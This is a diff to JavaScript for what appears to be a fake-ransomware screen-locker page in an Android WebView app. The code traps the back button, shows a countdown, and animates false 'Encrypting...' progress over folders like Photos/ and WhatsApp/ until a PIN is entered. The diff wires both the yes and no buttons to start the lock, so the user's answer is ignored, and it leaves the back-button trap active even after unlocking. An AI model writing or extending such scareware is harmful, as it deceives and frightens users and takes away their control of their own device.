@@ -4,17 +4,7 @@ let navLocked = false;
 let countdown;
 
 function handlePopState() {
-  if (navLocked) {
-    history.pushState(null, "", location.href);
-  }
-}
-
-function handleKeyDown(e) {
-  if (navLocked) {
-    e.preventDefault();
-    e.stopPropagation();
-    return false;
-  }
+  history.pushState(null, "", location.href);
 }
 
 function lockNavigation() {
@@ -22,14 +12,12 @@ function lockNavigation() {
   history.pushState(null, "", location.href);
   history.pushState(null, "", location.href);
   window.addEventListener("popstate", handlePopState);
-  document.addEventListener("keydown", handleKeyDown, true);
   try { window.Android.lockBack(); } catch(e) {}
 }
 
 function unlockNavigation() {
   navLocked = false;
   window.removeEventListener("popstate", handlePopState);
-  document.removeEventListener("keydown", handleKeyDown, true);
   try { window.Android.unlockBack(); } catch(e) {}
 }
 
@@ -47,7 +35,7 @@ function startCountdown() {
     const m = String(Math.floor((total%3600)/60)).padStart(2,"0");
     const s = String(total%60).padStart(2,"0");
     if (el) el.textContent = h+":"+m+":"+s;
-    if (total <= 0) clearInterval(countdown);
+    if (total<=0) clearInterval(countdown);
   }, 1000);
 }
 
@@ -59,7 +47,7 @@ function simulateProgress() {
   const fakeFiles = ["Documents/","Photos/","Videos/","Downloads/","WhatsApp/"];
   let fi = 0;
   const iv = setInterval(() => {
-    pct += Math.random() * 3;
+    pct += Math.random() * 4;
     if (pct > 100) pct = 100;
     if (bar) bar.style.width = pct + "%";
     if (fi < fakeFiles.length && pct > fi * 20) {
@@ -68,13 +56,13 @@ function simulateProgress() {
     }
     if (pct >= 100) {
       clearInterval(iv);
-      if (status) status.textContent = "Encryption complete.";
+      if (status) status.textContent = "Encryption complete!";
       const btn = document.getElementById("decryptBtn");
       if (btn) btn.removeAttribute("disabled");
     } else {
       if (status) status.textContent = "Encrypting... " + Math.floor(pct) + "%";
     }
-  }, 80);
+  }, 100);
 }
 
 window.onload = function() {
@@ -87,32 +75,37 @@ window.onload = function() {
   const pinOverlay = document.getElementById("pinOverlay");
   const closePinOverlay = document.getElementById("closePinOverlay");
 
-  if (noBtn) noBtn.addEventListener("click", () => {
+  function startApp() {
     if (welcomeDialog) welcomeDialog.style.display = "none";
     if (mainApp) mainApp.style.display = "block";
     lockNavigation();
     startCountdown();
     simulateProgress();
-  });
+  }
 
-  if (yesBtn) yesBtn.addEventListener("click", () => {
-    if (welcomeDialog) welcomeDialog.style.display = "none";
-    if (mainApp) mainApp.style.display = "block";
-    lockNavigation();
-    startCountdown();
-    simulateProgress();
-  });
+  if (yesBtn) yesBtn.addEventListener("click", startApp);
+  if (noBtn) noBtn.addEventListener("click", startApp);
 
   if (closePinOverlay) closePinOverlay.addEventListener("click", () => {
     if (pinOverlay) pinOverlay.setAttribute("hidden", "");
   });
 
   if (decryptBtn) decryptBtn.addEventListener("click", () => {
-    if (pinInput && pinInput.value === CORRECT_PIN) {
+    const val = pinInput ? pinInput.value.trim() : "";
+    if (val === CORRECT_PIN) {
       clearInterval(countdown);
       exitApp();
     } else {
       if (pinOverlay) pinOverlay.removeAttribute("hidden");
     }
   });
+
+  if (pinInput) {
+    pinInput.removeAttribute("disabled");
+    pinInput.addEventListener("input", () => {
+      if (decryptBtn && pinInput.value.length > 0) {
+        decryptBtn.removeAttribute("disabled");
+      }
+    });
+  }
 };
